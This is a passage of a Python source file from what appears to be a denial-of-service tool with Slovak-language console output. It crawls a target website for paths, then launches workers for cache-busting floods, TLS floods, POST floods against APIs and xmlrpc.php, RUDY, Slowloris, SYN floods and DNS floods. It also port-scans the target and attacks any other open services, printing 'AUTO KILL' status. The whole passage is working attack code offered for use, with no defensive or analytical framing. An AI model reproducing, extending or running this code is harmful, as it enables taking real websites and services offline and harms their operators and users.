                r = urllib.request.urlopen(req, timeout=6)
            html = r.read(131072).decode(errors="ignore")
            r.close()
            for u in v_links(html, url, host):
                q = urlparse(u)
                p = (q.path or "/") + ("?" + q.query if q.query else "")
                paths.append(p)
        except Exception:
            pass
        seen, out = set(), []
        for p in paths:
            if p not in seen:
                seen.add(p)
                out.append(p)
        return out[:96]

    def plan_svc(pn, si, pth, heavy=None):
        boot(f"CacheBuster:{pn}", tg_cache_worker,
             (host, pn, si["tls"], pth, st, stop), nprocs(sil) * 2)
        boot(f"Heavy:{pn}", tg_cache_worker,
             (host, pn, si["tls"], heavy or HEAVY_PATHS, st, stop),
             max(1, nprocs(sil) // 2))
        if si["tls"]:
            boot(f"TLS:{pn}", tls_flood_worker, (host, pn, st, stop),
                 max(1, nprocs(sil) // 2))
        if si["post_ok"]:
            boot(f"API:{pn}", api_worker, (host, pn, si["tls"],
                                           [pth, "/xmlrpc.php"], st, stop),
                 nprocs(sil) * 2)
            boot(f"RUDY:{pn}", rudy_worker, (host, pn, si["tls"], host, st, stop),
                 max(1, nprocs(sil) // 2))
        if pn == port:
            boot(f"Slowloris:{pn}", slow_worker,
                 (host, pn, si["tls"], host, st, stop, 20.0),
                 max(1, nprocs(sil) // 2))

    used = []

    print(f"  {C}[1/4]{X} {host} -> {ip} | zbieram cesty z webu + OKAMZITY utok ...")
    site_paths = get_site_paths()
    print(f"  {Y} Nahrane: {len(site_paths)} ciest z webu{X}")

    def add_main_svc2():
        ph = svc_probe(host, port, False, path)
        pt = svc_probe(host, port, True, path)
        si = pick_svc(ph, pt)
        if not si["ok"]:
            print(f"  {R}[!] Hlavny port {port} nereaguje, hladam inde...{X}")
            return False
        print(f"  {Y} web:{port}{X} {'https' if si['tls'] else 'http'}"
              f" | status {si['status']} | banner '{si['banner'] or '-'}'"
              f" | POST {G + 'ano' if si['post_ok'] else R + 'nie'}{X}")
        plan_svc(port, si, path, heavy=site_paths)
        used.append((port, si))
        return True

    add_main_svc2()

    def bg_scan():
        scan_ports = sorted(set(WEB_AUTO_PORTS + [port] +
                                [21, 22, 25, 53, 110, 143,
                                 3306, 5432, 6379, 11211]))
        open_ports = quick_scan(ip, scan_ports, 0.3)
        extras = []
        with ThreadPoolExecutor(max_workers=8) as ex:
            for pn in open_ports:
                if pn in WEB_AUTO_PORTS or pn == port:
                    continue
                pth = "/"
                ex.submit(lambda pn=pn: extras.append(
                    (pn, pick_svc(svc_probe(host, pn, False, pth),
                                  svc_probe(host, pn, True, pth)))))
            for pn in open_ports:
                if pn not in WEB_AUTO_PORTS and pn != port and pn != 53:
                    extras.append((pn, None))
        for pn, si in extras:
            if si is not None:
                if not si["ok"]:
                    continue
                tag = f"web:{pn}"
                if (pn, si) in used:
                    continue
                plan_svc(pn, si, "/")
                print(f"  {Y} + {tag}{X} {'https' if si['tls'] else 'http'}"
                      f" | POST {G + 'ano' if si['post_ok'] else R + 'nie'}{X} -> utok")
            else:
                boot(f"SYN:{pn}", syn_worker,
                     (build_tcp_pool(ip, pn, 0x02, "", 2048), st, stop),
                     max(1, nprocs(sil) // 2))
                print(f"  {Y} + SYN:{pn}{X} -> utok")
        if 53 in open_ports:
            boot("DNS:53", dns_worker, (build_dns_pool(host, 2048), ip, st, stop),
                 max(1, nprocs(sil) // 2))
            print(f"  {Y} + DNS:53{X} -> utok")

    bg = threading.Thread(target=bg_scan, daemon=True)
    bg.start()
    live(st, stop, active, dur, f"AUTO KILL {host}", "utokov")
    bg.join(timeout=2)

# ============================ MENU ============================

if __name__ == "__main__":
    main()
